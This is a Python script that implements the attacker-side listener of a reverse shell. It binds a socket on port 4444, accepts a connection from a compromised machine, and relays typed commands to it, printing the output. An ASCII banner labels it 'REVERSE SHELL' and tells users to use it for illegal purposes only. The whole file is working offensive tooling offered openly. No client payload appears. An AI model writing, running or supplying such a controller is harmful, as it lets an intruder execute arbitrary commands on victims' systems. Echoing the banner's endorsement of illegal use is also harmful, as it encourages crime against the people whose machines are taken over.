import socket
import sys
import os
os.system('clear')
print( """


       _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _  _ _
      |     _ _       _  _        _ _            |
      |    | _ ||\ |||_  _||\  /|| _ |           |
      |    ||_  | \||  ||  | \/ |||_||           |
      |    | _| ||\ | _||_ ||\/||| _ |           |
      |    |_ _||| \||_ _ |||  |||| ||           |
      |          {{REVERSE SHELL}}               |
      |               CRAETED BY:Akumar704|007ksv|
      |    FOLLOW US ON GITHUB.COM               |
      | _ __ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ |
           **USE THIS FOR ILLEGALE PURPOSE ONLY**

                                                                  """)

#creating a socket
def create_socket():
  try:
      global host
      global port
      global s
      host=""
      port=4444
      s=socket.socket()


  except  socket.error as msg:
      print ("Error While Creating Socket->  " + str(msg))



def bind_socket():
 try:
      global host
      global port
      global s
      print("***Server is Started on port->> " + str(port))
      s.bind((host,port))
      s.listen(5)
 except socket.error as msg:
      print ("Binding Error "+ str(msg) + "\n" + " chill Retrying...")
      bind_socket()  #Recursion So server Started Always

def socket_accept():
       c,a=s.accept()
       print("Connnected To  "+" |IP "+a[0]+" ||port "+str(a[1]))
       send_command(c)
       c.close()


def send_command(c):
     while True:
         cmd = input(">>")
         if cmd == 'quit':
             c.send(str.encode(cmd))
             c.close()
             s.close()
             sys.exit()
         if len(str.encode(cmd)) > 0:
           c.send(str.encode(cmd))
           clinet_response=str(c.recv(1048576),"utf-8")
           print(clinet_response , end=' ')
def main():
  create_socket()
  bind_socket()
  socket_accept()


main()
